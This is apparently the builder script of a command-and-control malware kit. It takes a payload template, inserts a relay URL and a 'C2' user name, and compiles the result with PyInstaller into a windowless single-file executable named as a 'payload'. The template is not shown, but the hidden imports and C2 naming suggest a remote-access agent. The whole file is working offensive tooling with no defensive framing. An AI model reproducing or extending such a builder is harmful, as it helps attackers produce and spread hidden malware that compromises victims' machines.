# builder.py
import os, subprocess, shutil, tempfile, sys

def build_payload(payload_name, relay_url, c2_user, log_callback):
    # This assumes the template is in the same directory as the script
    template_path = os.path.join(os.path.dirname(__file__), "payload_template.py")
    output_path = os.path.join(os.path.dirname(__file__), "output")

    if not os.path.exists(output_path):
        os.makedirs(output_path)
    
    final_payload_name = f"{payload_name}.exe"

    with tempfile.TemporaryDirectory() as temp_dir:
        log_callback("--> Creating build environment...")
        temp_script_path = os.path.join(temp_dir, "temp_agent.py")
        
        try:
            with open(template_path, "r") as f:
                code = f.read()
        except FileNotFoundError:
            log_callback(f"[ERROR] payload_template.py not found. Please ensure it's in the same directory.")
            return

        # Replace placeholders in the template
        code = code.replace("{{RELAY_URL}}", relay_url).replace("{{C2_USER}}", c2_user)
        
        with open(temp_script_path, "w") as f:
            f.write(code)
            
        log_callback("--> Compiling with PyInstaller...")
        
        # Define necessary hidden imports for PyInstaller
        hidden_imports = ['requests', 'psutil', 'shutil', 'getpass', 'base64']
        
        # Build the PyInstaller command
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', payload_name]
        for imp in hidden_imports:
            command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        # Run the command
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        
        for line in iter(process.stdout.readline, ''):
            log_callback(line.strip())
        process.wait()
        
        if process.returncode == 0:
            shutil.move(os.path.join(temp_dir, 'dist', final_payload_name), os.path.join(output_path, final_payload_name))
            log_callback(f"\n[SUCCESS] Payload saved to: {os.path.abspath(output_path)}")
        else:
            log_callback("\n[ERROR] PyInstaller failed. See log above.")